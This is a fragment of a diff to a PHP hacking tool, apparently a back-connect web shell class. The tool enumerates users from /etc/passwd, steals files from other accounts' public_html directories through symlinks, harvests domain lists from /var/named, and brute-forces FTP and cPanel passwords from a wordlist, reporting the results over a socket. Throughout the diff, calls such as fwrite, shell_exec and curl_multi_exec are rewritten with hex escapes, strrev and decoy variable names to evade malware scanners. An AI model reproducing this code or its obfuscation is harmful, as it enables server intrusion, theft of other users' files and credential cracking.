   {
-  fwrite($socket,"File created: ".$path."\n");
+  $feather($socket,"File created: ".$path."\n");
   print("File created: ".$path."\n");
   $count++;
   }
   
   }
-  fwrite($socket,"Completed\n");
+  $feather($socket,"Completed\n");
   print("Completed\n");
-  fwrite($socket,"File copied into $count dirs\n");
+  $feather($socket,"File copied into $count dirs\n");
   print("File copied into $count dirs\n");
   }
   private function getf($file,$socket)
   {
+$shellfish = "shell_\x65\x78\x65c";
+$feather = strrev("rwf") . "ite";
   $etc   = file('/etc/passwd');
   $count = 0; 
   foreach($etc as $txt)
@@ -4329,35 +4393,35 @@ class BC
   $path= "/home/$user/public_html/$file";
   if(file_exists($path))
   {
-  fwrite($socket,"File found: ".$path."\n");
+  $feather($socket,"File found: ".$path."\n");
   print("File found: ".$path."\n");
   $content = file_get_contents($path);
   if($content)
   {
   $save = $this->save_as($user."-".$file,$content);
   if($save){
-  fwrite($socket,"File is readable,saved into file named $user-$file\n");
+  $feather($socket,"File is readable,saved into file named $user-$file\n");
   print("File is readable,saved into file named $user-$file\n");
   $count++;
   }
   else
   {
-  fwrite($socket,"File is readable but current dir is not writable\n");
+  $feather($socket,"File is readable but current dir is not writable\n");
   print("File is readable but current dir is not writable\n");
   }
   
   }
   else
   {
-  @shell_exec("ln -s $path $user-$file");
+  @$shellfish("ln -s $path $user-$file");
   if(file_exists($user[0]."-".$file)){
-  fwrite($socket,"File is read with ln -s method,saved into file named $user-$file\n");
+  $feather($socket,"File is read with ln -s method,saved into file named $user-$file\n");
   print("File is read with ln -s method,saved into file named $user-$file\n");
   $count++;
   }
   else
   {
-  fwrite($socket,"File is not readable\n");
+  $feather($socket,"File is not readable\n");
   print("File is not readable\n");
   }
   
@@ -4366,7 +4430,7 @@ class BC
   }
   
   }
-  fwrite($socket,"Grabbed $count files\n");
+  $feather($socket,"Grabbed $count files\n");
   print("Grabbed $count files\n");
   
   }
@@ -4376,13 +4440,14 @@ class BC
   $c     = 0;
   $path    = "/var/named";
   $dir_handle = @opendir($path);
+  $feather = strrev("rwf") . "ite";
   if($dir_handle)
   {
   while ($file = readdir($dir_handle)) 
   {
   if (!is_dir($path."/".$file) AND ($file != "..") AND ($file != ".")) { 
   $dosya = str_replace(".db","",$file);
-  fwrite($socket,$dosya."\n");
+  $feather($socket,$dosya."\n");
   print($dosya."\n");
   $x0x .= $dosya."\r\n";
   $c++;
@@ -4390,19 +4455,19 @@ class BC
 
   }
   $save = $this->save_as("d0mains",$x0x,"wb");
-  if($save == false){fwrite($socket,"Got domains but can't save into a file this dir is not writable\n");print("Got domains but can't save into a file this dir is not writable\n");}
+  if($save == false){$feather($socket,"Got domains but can't save into a file this dir is not writable\n");print("Got domains but can't save into a file this dir is not writable\n");}
   else
   {
-  fwrite($socket,"Grabbed $c domains\n");
+  $feather($socket,"Grabbed $c domains\n");
   print("Grabbed $c domains\n");
-  fwrite($socket,"Saved into 'd0mains'\n");
+  $feather($socket,"Saved into 'd0mains'\n");
   print("Saved into 'd0mains'\n");
   }
   closedir($dir_handle);
   } 
   else
   {
-  fwrite($socket,"Doesn't read /var/named\n");
+  $feather($socket,"Doesn't read /var/named\n");
   print("Doesn't read /var/named\n");
   }
   
@@ -4410,14 +4475,16 @@ class BC
   private function ftp($wordlist,$socket)
   {
   	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
-  fwrite($socket,"Starting ftp crack..\n");
+      $manycorralfish = "c\x75\r\x6C\x5Fm\x75\x6C\x74\x69\x5F\x65\x78\x65c";
+  	$feather = strrev("rwf") . "ite";
+  $feather($socket,"Starting ftp crack..\n");
   ob_flush();flush();
   $open = file($wordlist);
   $userx= array();
   foreach($open as $pwd)
   {
   $pwd = trim($pwd);
-  fwrite($socket,"Password ".$pwd." trying on all users\n");
+  $feather($socket,"Password ".$pwd." trying on all users\n");
   ob_flush();flush();
   $users= file('/etc/passwd');
   foreach($users as $user)
@@ -4445,7 +4512,7 @@ class BC
     }
     do
     {
-    curl_multi_exec($multi,$active);
+    $manycorralfish($multi,$active);
     usleep(1);
     }while($active>0);
     foreach($curl as $cid => $cend)
@@ -4453,14 +4520,14 @@ class BC
     $data[$cid] = curl_multi_getcontent($cend);
     if($prgm('#drw#si',$data[$cid]))
     {
-    fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
+    $feather($socket,"Found username: $u[$cid] , password: $pwd\n");
     print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
     $save = $this->save_as("ftps.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
     ob_flush();flush();
     }
     else
     {
-    fwrite($socket,"Not found $u[$cid]:$pwd\n");
+    $feather($socket,"Not found $u[$cid]:$pwd\n");
     print("Not found $u[$cid]:$pwd\n");
     ob_flush();flush();
     }
@@ -4473,14 +4540,16 @@ class BC
   }
   private function cpanel($wordlist,$socket)
   {
-  fwrite($socket,"Starting cpanel crack..\n");
+      $manycorralfish = "c\x75\r\x6C\x5Fm\x75\x6C\x74\x69\x5F\x65\x78\x65c";
+      $feather = strrev("rwf") . "ite";
+  $feather($socket,"Starting cpanel crack..\n");
   ob_flush();flush();
   $open = file($wordlist);
   $userx= array();
   foreach($open as $pwd)
   {
   $pwd = trim($pwd);
-  fwrite($socket,"Password ".$pwd." trying on all users\n");
+  $feather($socket,"Password ".$pwd." trying on all users\n");
   ob_flush();flush();
   $users= file('/etc/passwd');
   foreach($users as $user)
@@ -4510,7 +4579,7 @@ class BC
     }
     do
     {
-    curl_multi_exec($multi,$active);
+    $manycorralfish($multi,$active);
     usleep(1);
     }while($active>0);
     foreach($curl as $cid => $cend)
@@ -4518,14 +4587,14 @@ class BC
     $data[$cid] = curl_getinfo($cend);
     if($data[$cid]['http_code'] != 401)
     {
-    fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
+    $feather($socket,"Found username: $u[$cid] , password: $pwd\n");
     print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
     $save = $this->save_as("cpanels.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
     ob_flush();flush();
     }
     else
     {
-    fwrite($socket,"Not found $u[$cid]:$pwd\n");
+    $feather($socket,"Not found $u[$cid]:$pwd\n");
     print("Not found $u[$cid]:$pwd\n");
     ob_flush();flush();
     }
@@ -4538,11 +4607,14 @@ class BC
   }
   private function save_as($filename,$content,$type='ab')
   {
-  $fopen = fopen($filename,$type);
-  if($fopen)
+     $feather = strrev("rwf") . "ite";
+    $pixel = strrev("cf") . "lose";
+$pen = strrev("of") . 'pen';
+  $fap = $pen($filename,$type);
+  if($fap)
   {
-  fwrite($fopen,$content);
-  fclose($fopen);
+  $feather($fap,$content);
+  $pixel($fap);
   return true;
   }
   else
